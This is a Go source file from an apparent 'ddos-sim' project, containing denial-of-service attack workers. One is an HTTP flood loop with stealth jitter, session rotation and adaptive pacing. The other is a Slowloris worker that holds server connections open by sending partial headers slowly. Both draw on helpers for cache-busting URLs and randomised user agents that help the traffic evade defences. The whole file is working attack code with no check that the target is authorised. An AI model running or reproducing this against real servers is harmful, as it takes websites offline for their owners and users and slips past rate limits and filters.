package attack

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"ddos-sim/internal/config"
	"ddos-sim/internal/evasion"
	"ddos-sim/internal/metrics"

	"golang.org/x/time/rate"
)

// Worker runs a standard HTTP flood/stealth/ramp worker loop.
func Worker(id int, cfg *config.TestConfig, m *metrics.Metrics, wg *sync.WaitGroup,
	ctx context.Context, rateLimiter *rate.Limiter, requestCounter *int64, client *http.Client,
	adaptive *AdaptiveController) {
	defer wg.Done()

	WarmupSession(client, cfg)

	sequence := 0
	sessionLifetime := 500 + rand.Intn(500)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if cfg.TotalRequests > 0 {
				current := atomic.AddInt64(requestCounter, 1)
				if current > cfg.TotalRequests {
					return
				}
			}

			if rateLimiter != nil {
				if err := rateLimiter.Wait(ctx); err != nil {
					return
				}
			}

			if adaptive != nil {
				if d := adaptive.GetDelay(); d > 0 {
					time.Sleep(d)
				}
			}

			if cfg.Mode == config.ModeStealth {
				jitter := time.Duration(20+rand.Intn(180)) * time.Millisecond
				if rand.Intn(20) == 0 {
					jitter += time.Duration(500+rand.Intn(2000)) * time.Millisecond
				}
				time.Sleep(jitter)
			}

			sequence++
			result := MakeRequest(client, cfg, sequence)
			m.Update(result)

			if sequence%sessionLifetime == 0 {
				client = BuildClient(cfg, id+rand.Intn(100))
				WarmupSession(client, cfg)
				sessionLifetime = 500 + rand.Intn(500)
			}
		}
	}
}

// SlowlorisWorker holds connections open with slow partial HTTP headers.
func SlowlorisWorker(id int, cfg *config.TestConfig, m *metrics.Metrics, wg *sync.WaitGroup,
	ctx context.Context, requestCounter *int64) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if cfg.TotalRequests > 0 {
				current := atomic.AddInt64(requestCounter, 1)
				if current > cfg.TotalRequests {
					return
				}
			}

			start := time.Now()
			targetURL := evasion.CacheBustURL(evasion.PickTarget(cfg))

			parsed, _ := url.Parse(targetURL)
			host := parsed.Host
			if !strings.Contains(host, ":") {
				if parsed.Scheme == "https" {
					host += ":443"
				} else {
					host += ":80"
				}
			}

			var conn net.Conn
			var err error
			dialer := &net.Dialer{Timeout: 10 * time.Second}

			if parsed.Scheme == "https" {
				conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
					InsecureSkipVerify: cfg.InsecureSkipVerify,
				})
			} else {
				conn, err = dialer.DialContext(ctx, "tcp", host)
			}

			if err != nil {
				m.Update(metrics.RequestResult{Duration: time.Since(start), Error: err})
				continue
			}

			reqURI := "/"
			if parsed.RequestURI() != "" {
				reqURI = parsed.RequestURI()
			}
			reqLine := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
				reqURI, parsed.Hostname(), evasion.RandomUA())
			conn.Write([]byte(reqLine))

			for i := 0; i < 10; i++ {
				select {
				case <-ctx.Done():
					conn.Close()
					return
				case <-time.After(time.Duration(3+rand.Intn(7)) * time.Second):
					header := fmt.Sprintf("X-a-%d: %d\r\n", i, rand.Intn(10000))
					if _, err := conn.Write([]byte(header)); err != nil {
						break
					}
				}
			}

			conn.Close()
			m.Update(metrics.RequestResult{Duration: time.Since(start), StatusCode: 0})
		}
	}
}

// runWorker is needed to avoid import cycle — wraps the public Worker with a new client.
func runWorker(id int, cfg *config.TestConfig, m *metrics.Metrics, wg *sync.WaitGroup,
	ctx context.Context, rateLimiter *rate.Limiter, requestCounter *int64,
	adaptive *AdaptiveController) {
	client := BuildClient(cfg, id)
	Worker(id, cfg, m, wg, ctx, rateLimiter, requestCounter, client, adaptive)
}
